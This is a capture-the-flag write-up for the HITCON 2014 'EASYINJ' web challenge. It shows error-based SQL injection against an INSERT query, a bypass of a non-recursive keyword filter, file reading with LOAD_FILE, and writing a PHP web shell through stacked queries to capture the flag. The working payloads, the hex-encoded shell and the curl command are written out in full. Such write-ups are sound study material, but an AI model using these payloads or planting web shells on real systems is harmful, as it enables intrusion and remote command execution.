# HITCON CTF 2014: EASYINJ

**Category:** Web
**Points:** 300
**Description:**

> http://54.238.22.67:10653/

## Write-up

When accessing the URL posted in the description, we are immediately forwarded to `http://54.238.22.67:10653/index.php?ip={your public IP address here}`, which displays the output of `phpinfo()`. As there is just one parameter, and the name of the challenge indicates this might be some sort of injection challenge, the first obvious step is to check for MySQL injection. Loading `http://54.238.22.67:10653/index.php?ip='` shows the following error message:

```
Warning: PDO::query() [pdo.query]: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''')' at line 1 in Z:\AppServ\www\index.php on line 43
```

Now that we know there’s SQL injection, what useful things can we do with this? We can’t see any output of the query, other than the error messages, so things like `UNION SELECT` won’t be any use. After trying a few things, I found that certain keywords appeared to be filtered. For instance, `http://54.238.22.67:10653/index.php?ip='foo.bar` returns:

```
Warning: PDO::query() [pdo.query]: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'foobar')' at line 1 in Z:\AppServ\www\index.php on line 43
```

This shows that `foo.bar` is replaced by `foobar`, meaning that dots were filtered. Some keywords were filtered as well: for instance, `http://54.238.22.67:10653/index.php?ip='fooSELECTbar` gives the same warning as above, meaning that `SELECT` is removed from the query. Luckily the stripping of keywords wasn’t recursive, so in order to get a `SELECT`, you could request `http://54.238.22.67:10653/index.php?ip='fooSSELECTELECTbar`, which would show the following warning:

```
Warning: PDO::query() [pdo.query]: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'fooSELECTbar')' at line 1 in Z:\AppServ\www\index.php on line 43
```

With all this information, we are ready to start extracting some data. It is possible to do this via a time-based attack, using constructs like `SELECT IF (SUBSTR(version(),1,1) = '5', SLEEP(10), 1)`, but this would take ages. [This blog post](http://www.mathyvanhoef.com/2011/10/exploiting-insert-into-sql-injections.html) nicely describes how this can be done by generating errors containing the output of a query. I won’t go into detail on how this works exactly, but do refer to the blog post if you’re interested.

Using this error-based technique, we can construct our payload like this:

```
http://54.238.22.67:10653/?ip='-(SSELECTELECT 1 FFROMROM (SSELECTELECT COUNT(1),CONCAT((SSELECTELECT 'test'),FLOOORR(RAANDND(0)*2)) x FFROMROM log GROUP BY x) t1)-'
```

This returns:

```
 Warning: PDO::query() [pdo.query]: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'test1' for key 1 in Z:\AppServ\www\index.php on line 43
```

Note that the error message contains the result of our subquery, namely `test`. We can also run some more useful queries, such as `version()` (result: `5.0.51b-community-nt-log`), `user()` (result: `root@localhost`). Since the current MySQL user is root, we can most likely read files as well, so let’s try it for the `index.php` file:

```
http://54.238.22.67:10653/?ip='-(SSELECTELECT 1 FFROMROM (SSELECTELECT COUNT(1),CONCAT((SSELECTELECT LLOAD_FILEOAD_FILE(0x5a3a2f417070536572762f7777772f696e6465782e706870)),FLOOORR(RAANDND(0)*2)) x FFROMROM log GROUP BY x) t1)-'
```

*Note: Since dots are removed, `Z:/AppServ/www/index.php` is encoded as `0x5a3a2f417070536572762f7777772f696e6465782e706870`.*

This returns:

```
Warning: PDO::query() [pdo.query]: SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row in Z:\AppServ\www\index.php on line 43
```

We can fix this by doing `SUBSTR(LOAD_FILE(...),1,40)`, which shows the first 40 bytes of the `index.php` file: `<?php if (!isset($_SESSION)) { session`. By increasing the offset of `SUBSTR()`, it’s possible to extract the contents of [the complete `index.php` file](index.php).

The `index.php` file shows that `phpinfo()` entries are written to `log_guess^2/{$_SERVER['REMOTE_ADDR']}`. This gives us a directory that might be writable – let’s try uploading a shell there.

Since the query we’re injecting into is `INSERT INTO`, we can’t directly use `SELECT … INTO OUTFILE`. However, it is possible to use stacked queries for this purpose. Because dots are filtered, we will need to use prepared statements to write to a `.php` file. This what I used to write a shell to `Z:/AppServ/www/log_guess^2/inject-this.php`:

```
$ cat query.sql
SELECT '<?php if(isset($_GET["x"])){echo "<pre>".shell_exec($_GET["x"])."</pre>";} ?>' INTO OUTFILE 'Z:/AppServ/www/log_guess^2/inject-this.php'

$ xxd -p < query.sql | tr -d '\n'
0x53454c45435420273c3f70687020696628697373657428245f4745545b2278225d29297b6563686f20223c7072653e222e7368656c6c5f6578656328245f4745545b2278225d292e223c2f7072653e223b7d203f3e2720494e544f204f555446494c4520275a3a2f417070536572762f7777772f6c6f675f67756573735e322f696e6a6563742d746869732e706870270a

$ curl -s "http://54.238.22.67:10653/?ip=');SET @a=0x53454c45435420273c3f70687020696628697373657428245f4745545b2278225d29297b6563686f20223c7072653e222e7368656c6c5f6578656328245f4745545b2278225d292e223c2f7072653e223b7d203f3e2720494e544f204f555446494c4520275a3a2f417070536572762f7777772f6c6f675f67756573735e322f696e6a6563742d746869732e706870270a;PREPARE st FFROMROM @a;EXECUTE st;SSELECTELECT ('"
```

With this shell we can easily find the flag using `http://54.238.22.67:10653/log_guess^2/inject-this.php?x=dir Z:\`. This shows that the flag is located in `Z:\key_39uti2jb.txt`. Using `type` (`http://54.238.22.67:10653/log_guess%5E2/inject-this.php?x=type%20Z:\key_39uti2jb.txt`), we get the flag: `HITCON{a2f7af2ba385ea71bfa597f3aa692368}`.

## Other write-ups and resources

* [Exploiting `INSERT INTO` SQL injections ninja-style](http://www.mathyvanhoef.com/2011/10/exploiting-insert-into-sql-injections.html)
